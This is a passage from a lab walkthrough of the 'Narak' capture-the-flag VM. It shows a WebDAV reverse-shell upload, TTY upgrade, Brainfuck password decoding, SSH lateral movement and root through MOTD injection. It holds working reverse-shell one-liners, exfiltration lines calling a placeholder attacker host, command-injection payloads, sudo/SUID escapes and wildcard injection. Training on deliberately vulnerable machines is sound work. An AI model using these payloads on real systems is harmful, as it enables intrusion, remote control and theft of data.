> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" shell.php
grep -nE '^\$(ip|port)' shell.php
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

### 3.3 Upload with `cadaver`

`cadaver` is a command-line WebDAV client — an interactive shell over HTTP.

```bash
cadaver http://192.168.56.111/webdav/
```

```text
Authentication required for WebDAV on server `192.168.56.111':
Username: yamdoot
Password:
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:                                   0  May 11  2024
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5493 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:                                   0  May 11  2024
        shell.php                        5493  May 11 14:31
dav:/webdav/> quit
Connection to `192.168.56.111' closed.
```

> **Common `cadaver` commands:** `ls`, `cd`, `put <file>`, `get <file>`, `mkdir`,
> `delete`, `mv`, `cp`, `propget`, `lock`, `unlock`, `quit`.
>
> **The whole attack is one HTTP verb.** If you prefer not to use an interactive
> client, `curl` does it directly — and it is worth seeing the raw request:
>
> ```bash
> curl -s -T shell.php -u 'yamdoot:Swarg' http://192.168.56.111/webdav/shell.php -o /dev/null -w '%{http_code}\n'
> ```
>
> ```text
> 201
> ```
>
> `201 Created` is the success code for `PUT`. `-T` means "upload this file".

### 3.4 Catch the shell

```bash
# Kali
nc -nlvp 4444
```

```text
listening on [any] 4444 ...
```

Now request the uploaded file — from a browser, or:

```bash
curl -s "http://192.168.56.111/webdav/shell.php" -o /dev/null
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 55218
Linux narak 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:34:07 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 3.5 Upgrade to a real TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@narak:/var/www/html/webdav$
```

`Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Back on the target:

```bash
www-data@narak:/var/www/html/webdav$ export TERM=xterm
www-data@narak:/var/www/html/webdav$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Foothold established.** ✅

![cadaver PUT shell.php and netcat catching the reverse shell](images/04-webdav-shell.png)

---

## 4. Post-exploitation — the Brainfuck script

### 4.1 Standard sweep first

Never skip the basics, even when a hint is obvious:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
www-data@narak:/$ sudo -l
```

```text
Matching Defaults entries for www-data on narak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on narak:
```


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@narak:/$ find / -perm -u=s -type f 2>/dev/null
```

```text
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

All stock Ubuntu — nothing to abuse. Check cron:


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
www-data@narak:/$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Nothing custom.

### 4.2 Find world-writable files — the documented route


> ### 📖 Concept — Finding files root executes that *you* can write
>
> This is the classic Linux privilege-escalation question: *is there anything that
> runs with elevated privileges whose contents I control?*
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
>      -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
> find / -type f -perm -ug=rwx 2>/dev/null                    # rwx for user AND group
> find / -xdev -type f -perm -0002 -user root 2>/dev/null      # world-writable, root-owned
> ```
>
> `-perm -0002` tests the **other-write** bit. `-xdev` keeps the search on one
> filesystem so you do not wander into `/proc`.
>
> **High-value targets, in rough order of usefulness:**
>
> | Path | Why |
> | --- | --- |
> | **`/etc/passwd`** | Append a UID-0 account → `su` → root |
> | **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** (MOTD injection) |
> | `/etc/sudoers`, `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
> | `/etc/shadow` | Replace a hash with one you know |
> | `/etc/ld.so.preload` | A library loaded into **every** process, as root |
> | `/etc/crontab`, `/etc/cron.*` | Add a root job |
> | `/etc/exports` | Add `no_root_squash` to an NFS export |
> | root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |
> | any user's `~/.ssh/authorized_keys` | Passwordless SSH as them |
>
> **MOTD injection deserves special mention.** On Ubuntu/Debian, `pam_motd` runs every
> script in `/etc/update-motd.d/` during SSH login, historically **as root**. If any
> is writable by you, append a payload and log in again:
>
> ```bash
> echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
> exit ; ssh user@target      # → root reverse shell
> ```
>
> Use `>>` to **append** — `>` truncates the script and breaks the MOTD, which is how
> you end up wondering why nothing happened. Verify with `tail`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files](../../docs/CONCEPTS.md#156-writable-files-and-directories) ·
> [§15.11 — MOTD injection](../../docs/CONCEPTS.md#1511-motd-injection)

```bash
www-data@narak:/$ find / -type f -perm -ug=rwx 2>/dev/null
```

> **Read that `-perm` test carefully.** `-perm -ug=rwx` means "the file has *at
> least* read+write+execute for **both** the owning user and the owning group".
> The leading `-` makes it a *subset* match, not exact equality. It is a quick way
> to find over-permissive files.
>
> A broader and often more useful variant, worth memorising:
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/var/*" 2>/dev/null
> ```

```text
/mnt/hell.sh
```

**One file: `/mnt/hell.sh`.**

```bash
www-data@narak:/$ ls -la /mnt/hell.sh
-rwxrwxrwx 1 root root 217 Sep 22  2020 /mnt/hell.sh
www-data@narak:/$ cat /mnt/hell.sh
```

```bash
echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

### 4.3 Recognise Brainfuck

> **Brainfuck** is a deliberately minimal esoteric programming language from 1993.
> It has **exactly eight commands**, all single characters:
>
> | Command | Action |
> | --- | --- |
> | `>` | Move the data pointer one cell right |
> | `<` | Move the data pointer one cell left |
> | `+` | Increment the byte at the pointer |
> | `-` | Decrement the byte at the pointer |
> | `.` | **Output** the byte at the pointer |
> | `,` | Read one byte of input into the cell |
> | `[` | If the cell is zero, jump forward past the matching `]` |
> | `]` | If the cell is non-zero, jump back to the matching `[` |
>
> Every other character is a comment and is ignored. Programs build up ASCII
> character codes by counting: `+++++++++[>++++++++<-]>.` sets up 9×8=72 and
> prints `H`.
>
> **How to spot it in the wild:** a long string consisting *only* of
> `+ - < > [ ] . ,` with no letters or spaces. Once you have seen it once you
> never forget the shape. It is a popular CTF "encryption" because it looks
> alien but is trivially reversible.

### 4.4 Decode it

**Option A — an online interpreter.** <https://copy.sh/brainfuck/> or
<https://www.dcode.fr/brainfuck-language> will decode it instantly.

**Option B — write your own (20 lines, and you will actually understand it).**
This is the exercise worth doing:

```bash
cat > bf.py <<'PY'
import sys

def brainfuck(code, tape_size=30000):
    tape = [0] * tape_size
    ptr = out = 0
    # First pass: build the bracket jump table
    bracket, stack = {}, []
    for i, ch in enumerate(code):
        if ch == '[':
            stack.append(i)
        elif ch == ']':
            o = stack.pop()
            bracket[o], bracket[i] = i, o
    # Second pass: execute
    result = []
    while ptr < len(code):
        ch = code[ptr]
        if   ch == '>': out += 1
        elif ch == '<': out -= 1
        elif ch == '+': tape[out] = (tape[out] + 1) % 256
        elif ch == '-': tape[out] = (tape[out] - 1) % 256
        elif ch == '.': result.append(chr(tape[out]))
        elif ch == ',': tape[out] = ord(sys.stdin.read(1) or '\0')
        elif ch == '[' and tape[out] == 0: ptr = bracket[ptr]
        elif ch == ']' and tape[out] != 0: ptr = bracket[ptr]
        ptr += 1
    return ''.join(result)

if __name__ == '__main__':
    src = open(sys.argv[1]).read() if len(sys.argv) > 1 else sys.stdin.read()
    print(brainfuck(src))
PY

# extract only the brainfuck characters from hell.sh
grep -o '[+\-<>[\].,]' /mnt/hell.sh | tr -d '\n' > payload.bf
cat payload.bf
python3 bf.py payload.bf
```

```text
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

```text
chitragupt
```

**Decoded: `chitragupt`.** ✅

> *Chitragupta* is the Hindu god who keeps the ledger of every soul's deeds and
> assigns them to heaven or hell — a perfect fit for a password on a box called
> Narak. (The decoded string drops the final `a`, which is a useful confirmation
> that the interpreter ran cleanly: garbage produces garbage, not a name.)
>
> `grep -o '[+\-<>[\].,]'` prints **only** the matched characters, one per line;
> `tr -d '\n'` rejoins them. That is how you strip the `echo"Highway to Hell";`
> preamble and any whitespace so the interpreter sees pure Brainfuck.

### 4.5 Find the users and the user flag

```bash
www-data@narak:/$ cat /etc/passwd | grep -E '/bin/(ba)?sh$'
```

```text
root:x:0:0:root:/root:/bin/bash
narak:x:1000:1000:narak,,,:/home/narak:/bin/bash
inferno:x:1001:1001:,,,:/home/inferno:/bin/bash
yamdoot:x:1002:1002:,,,:/home/yamdoot:/bin/bash
```

```bash
www-data@narak:/$ ls -la /home/
total 20
drwxr-xr-x  5 root    root    4096 Sep 22  2020 .
drwxr-xr-x 20 root    root    4096 Sep 22  2020 ..
drwxr-xr-x  3 inferno inferno 4096 Sep 23  2020 inferno
drwxr-xr-x  3 narak   narak   4096 Sep 22  2020 narak
drwx------  2 yamdoot yamdoot 4096 Sep 22  2020 yamdoot

www-data@narak:/$ ls -la /home/inferno/
total 28
drwxr-xr-x 3 inferno inferno 4096 Sep 23  2020 .
drwxr-xr-x 5 root    root    4096 Sep 22  2020 ..
-rw-r--r-- 1 inferno inferno  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 inferno inferno 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 inferno inferno  807 Feb 25  2020 .profile
drwxrwxr-x 2 inferno inferno 4096 Sep 23  2020 .ssh
-rw-r--r-- 1 inferno inferno   36 Sep 23  2020 user.txt

www-data@narak:/$ cat /home/inferno/user.txt
```

```text
flag{Y0u_3sc4p3d_th3_H3ll_0f_W3bDAV}
```

**Flag 1 of 2 — `user.txt`.** ✅

> **Why `inferno` and not `narak`?** `/home/narak` is `drwxr-xr-x` and owned by
> `narak`, so `www-data` *can* list it — check it anyway. But `yamdoot`'s home is
> `drwx------`, unreadable. The `user.txt` sitting world-readable in `inferno` is
> the author telling you **`inferno` is the intended next account** — which pairs
> with the `chitragupt` password you just decoded.
>
> *"Inferno"* is Italian/Latin for Hell; *"Narak"* is the Sanskrit word for the
> same place. The naming is the hint.

![Brainfuck decode producing chitragupt, and user.txt](images/05-brainfuck-userflag.png)

---

## 5. Lateral movement — SSH as `inferno`

```bash
# Kali
ssh inferno@192.168.56.111
```

```text
inferno@192.168.56.111's password: chitragupt
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Sep 23 02:14:11 2020 from 192.168.1.9
inferno@narak:~$ id
uid=1001(inferno) gid=1001(inferno) groups=1001(inferno)
inferno@narak:~$ pwd
/home/inferno
```

> **A real SSH session is a huge quality-of-life upgrade** over a web shell: full
> job control, working `Ctrl+C`, `sudo` prompts, `vim`, tab completion. Always
> convert to SSH the moment you have any valid credential.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 6. Privilege escalation — MOTD injection

### 6.1 Enumerate `sudo` rights

```bash
inferno@narak:~$ sudo -l
```

```text
Matching Defaults entries for inferno on narak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User inferno may run the following commands on narak:
```

Nothing. SUID is the same stock list as §4.1. So where is the escalation?

### 6.2 Find what `inferno` can write that root executes

The classic Linux privesc question. Run the broad search:

```bash
inferno@narak:~$ find / -writable -type f \
  -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null
```

```text
/etc/update-motd.d/00-header
/run/user/1001/systemd/private
```

**`/etc/update-motd.d/00-header` is writable by `inferno`.** Look at it:

```bash
inferno@narak:~$ ls -la /etc/update-motd.d/
total 24
drwxr-xr-x  2 root root 4096 Sep 22  2020 .
drwxr-xr-x 94 root root 4096 Sep 22  2020 ..
-rwxrwxrwx  1 root root 1220 Sep 22  2020 00-header
-rwxr-xr-x  1 root root 1357 Apr  9  2020 10-help-text
-rwxr-xr-x  1 root root   91 Apr  9  2020 90-updates-available
-rwxr-xr-x  1 root root   91 Apr  9  2020 91-release-upgrade
-rwxr-xr-x  1 root root  334 Apr  9  2020 97-overlayroot
-rwxr-xr-x  1 root root  179 Apr  9  2020 98-fsck-at-reboot
-rwxr-xr-x  1 root root  165 Apr  9  2020 98-reboot-required

inferno@narak:~$ head -20 /etc/update-motd.d/00-header
```

```bash
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
	# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
```

> ### ⚠️ `-rwxrwxrwx` on `/etc/update-motd.d/00-header` — mode `777`, owned by root
>
> **This is the entire privilege escalation, and it is worth understanding
> deeply because it is a real-world bug that has appeared in Ubuntu itself.**
>
> **How MOTD works on Ubuntu/Debian:**
> 1. A user authenticates over SSH.
> 2. The SSH session runs **`pam_motd.so`** as part of the PAM stack.
> 3. `pam_motd` executes **every script in `/etc/update-motd.d/`** in
>    alphanumeric order (`00-header`, `10-help-text`, `90-updates-available`…),
>    concatenates their output, and prints it as the "Message Of The Day" banner.
> 4. Historically — and on the Ubuntu version this box runs — those scripts
>    execute with **root privileges**, because the MOTD is regenerated
>    system-wide rather than per-user.
>
> **So:** any file in that directory that a low-privileged user can *write* is a
> **root code-execution primitive that fires on the next SSH login**. You do not
> need a buffer overflow, a race condition, or a kernel exploit. You append a
> line, log in again, and you are root.
>
> **Why `777` here?** Almost certainly the author did it deliberately for the CTF,
> but the same class of bug has shipped in real Ubuntu releases: several CVEs
> (e.g. around `pam_motd` and `/etc/update-motd.d` ownership) arise from exactly
> this ordering problem — a user-writable MOTD script plus root execution.

### 6.3 Escalation variant A — reverse shell (cleanest)

```bash
# Kali — listener
nc -lvnp 9090
```

```bash
# target, as inferno
inferno@narak:~$ echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
inferno@narak:~$ tail -3 /etc/update-motd.d/00-header
```

```bash
printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"
```

> `>>` **appends**; `>` would have *truncated* the script and broken the MOTD.
> Get this wrong and you will wonder why nothing happened. Always verify with
> `tail`.

Now **exit and log back in** — the payload only fires during PAM's MOTD phase:

```bash
inferno@narak:~$ exit
logout
Connection to 192.168.56.111 closed.
```

```bash
# Kali
ssh inferno@192.168.56.111
```

Your listener on 9090 catches a **root** shell:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 41882
root@narak:~# id
uid=0(root) gid=0(root) groups=0(root)
root@narak:~# whoami
root
```

> **Look at that prompt: `root@narak:~#`.** You logged in as `inferno` and got a
> root shell back. Nothing about `inferno`'s own privileges changed — the MOTD
> script ran as root *before* your user session started.

![Root reverse shell triggered by MOTD injection](images/06-motd-root.png)

### 6.4 Escalation variant B — SUID `bash` (the fastest, from the box's own comments)

A reader of the official walkthrough contributed this shorter route:

```bash
# target, as inferno
inferno@narak:~$ echo 'sudo cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali — log back in to trigger it
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1183448 Sep 23 02:41 /tmp/rootbash
inferno@narak:~$ /tmp/rootbash -p
root@narak:~# id
uid=0(root) gid=0(root) groups=0(root),1001(inferno)
```

> **Why `-p`?** By default, `bash` **drops** its effective UID to the real UID on
> startup, as a security measure — so a SUID-root bash would normally start you
> off as `inferno` anyway. `-p` (*privileged*) disables that drop and keeps the
> effective UID 0. **Whenever you abuse a SUID shell you must pass `-p`.** This
> trips up almost every student the first time.
>
> `-rwsr-sr-x` in the listing is the SUID+SGID signature: an `s` where the owner's
> `x` would be.

### 6.5 Escalation variant C — SUID `nano`, then edit `/etc/passwd`

This is the route in the official walkthrough:

```bash
# target, as inferno
inferno@narak:~$ which nano
/usr/bin/nano
inferno@narak:~$ ls -la /bin/nano
-rwxr-xr-x 1 root root 245824 Sep  2  2020 /bin/nano
inferno@narak:~$ echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ ls -la /bin/nano
-rwsr-xr-x 1 root root 245824 Sep  2  2020 /bin/nano
```

Now `nano` runs as root, so it can *save* `/etc/passwd`:


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
